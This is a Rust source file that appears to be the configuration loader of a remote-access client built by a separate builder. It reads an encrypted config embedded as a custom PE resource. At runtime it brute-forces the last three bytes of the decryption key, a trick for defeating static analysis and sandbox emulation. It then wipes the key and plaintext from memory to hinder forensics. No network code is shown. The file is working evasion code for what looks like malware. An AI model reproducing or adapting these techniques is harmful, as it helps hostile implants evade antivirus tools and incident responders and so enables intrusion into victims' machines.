//! Client configuration - loaded from encrypted PE resource at runtime.
//!
//! The builder injects an encrypted config as a PE resource.
//! At runtime, we brute-force the last 3 bytes of the key to decrypt it.
//! Key and plaintext are wiped from memory immediately after parsing.

use wavegate_shared::ClientConfig;
use std::ptr;

/// Magic bytes at start of decrypted config for validation
const CONFIG_MAGIC: &[u8] = b"RGCFG001";

/// Embedded client configuration (decrypted at runtime from PE resource)
pub static CONFIG: once_cell::sync::Lazy<ClientConfig> = once_cell::sync::Lazy::new(|| {
    load_config_from_resource().expect("Failed to load configuration")
});

/// Securely zero memory
#[inline(never)]
fn secure_zero(data: &mut [u8]) {
    unsafe {
        std::ptr::write_volatile(data.as_mut_ptr(), 0);
        for i in 0..data.len() {
            std::ptr::write_volatile(data.as_mut_ptr().add(i), 0);
        }
    }
    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
}

/// Load and decrypt config from PE resource
fn load_config_from_resource() -> Result<ClientConfig, &'static str> {
    // Read the encrypted resource
    let encrypted = read_pe_resource()?;

    if encrypted.len() < 41 {
        return Err("Resource too small");
    }

    // Extract components:
    // [0..29]  = key prefix (29 bytes)
    // [29..37] = nonce (8 bytes for ChaCha20)
    // [37..]   = ciphertext (includes CONFIG_MAGIC + JSON + Poly1305 tag)
    let key_prefix: [u8; 29] = encrypted[0..29].try_into().unwrap();
    let nonce: [u8; 8] = encrypted[29..37].try_into().unwrap();
    let ciphertext = &encrypted[37..];

    // Brute-force the last 3 bytes of the key, get config, wipe sensitive data
    let config = brute_force_decrypt_and_parse(&key_prefix, &nonce, ciphertext)?;

    Ok(config)
}

/// Read encrypted config from PE resource
fn read_pe_resource() -> Result<Vec<u8>, &'static str> {
    use windows::Win32::System::LibraryLoader::{
        FindResourceW, LoadResource, LockResource, SizeofResource, GetModuleHandleW,
    };
    use windows::core::PCWSTR;

    unsafe {
        // Get handle to our own executable
        let hmodule = GetModuleHandleW(PCWSTR(ptr::null()))
            .map_err(|_| "Failed to get module handle")?;

        // Resource type 256 (RT_RCDATA = 10, but we use custom type 256)
        // Resource name "CONFIG" as wide string
        let resource_name: Vec<u16> = "CONFIG\0".encode_utf16().collect();
        let resource_type = PCWSTR(256 as *const u16); // Custom resource type

        let hres = FindResourceW(
            Some(hmodule),
            PCWSTR(resource_name.as_ptr()),
            resource_type,
        );

        if hres.is_invalid() {
            return Err("Config resource not found");
        }

        let size = SizeofResource(Some(hmodule), hres);
        if size == 0 {
            return Err("Config resource is empty");
        }

        let hglobal = LoadResource(Some(hmodule), hres)
            .map_err(|_| "Failed to load resource")?;

        let data_ptr = LockResource(hglobal);
        if data_ptr.is_null() {
            return Err("Failed to lock resource");
        }

        // Copy data to Vec
        let slice = std::slice::from_raw_parts(data_ptr as *const u8, size as usize);
        Ok(slice.to_vec())
    }
}

/// Brute-force decrypt, parse config, and securely wipe all sensitive data
fn brute_force_decrypt_and_parse(
    key_prefix: &[u8; 29],
    nonce: &[u8; 8],
    ciphertext: &[u8],
) -> Result<ClientConfig, &'static str> {
    use chacha20poly1305::{XChaCha20Poly1305, KeyInit, aead::Aead};
    use chacha20poly1305::aead::generic_array::GenericArray;

    // Build full 24-byte nonce for XChaCha20 (pad 8-byte nonce with zeros)
    let mut full_nonce = [0u8; 24];
    full_nonce[..8].copy_from_slice(nonce);
    let nonce_ga = GenericArray::from_slice(&full_nonce);

    // Try all 2^24 possible suffixes
    for suffix in 0..=0xFFFFFFu32 {
        let mut key = [0u8; 32];
        key[..29].copy_from_slice(key_prefix);
        key[29] = (suffix >> 16) as u8;
        key[30] = (suffix >> 8) as u8;
        key[31] = suffix as u8;

        let cipher = XChaCha20Poly1305::new(GenericArray::from_slice(&key));

        if let Ok(mut plaintext) = cipher.decrypt(nonce_ga, ciphertext) {
            // Verify magic header
            if plaintext.starts_with(CONFIG_MAGIC) {
                // Parse JSON (skip magic header)
                let json_data = &plaintext[CONFIG_MAGIC.len()..];
                let config_result = serde_json::from_slice::<ClientConfig>(json_data);

                // Wipe key immediately
                secure_zero(&mut key);

                // Wipe plaintext immediately
                secure_zero(&mut plaintext);

                // Wipe nonce
                secure_zero(&mut full_nonce);

                return config_result.map_err(|_| "Invalid config JSON");
            }
        }

        // Wipe key after each failed attempt
        secure_zero(&mut key);
    }

    Err("Failed to decrypt config (key not found)")
}
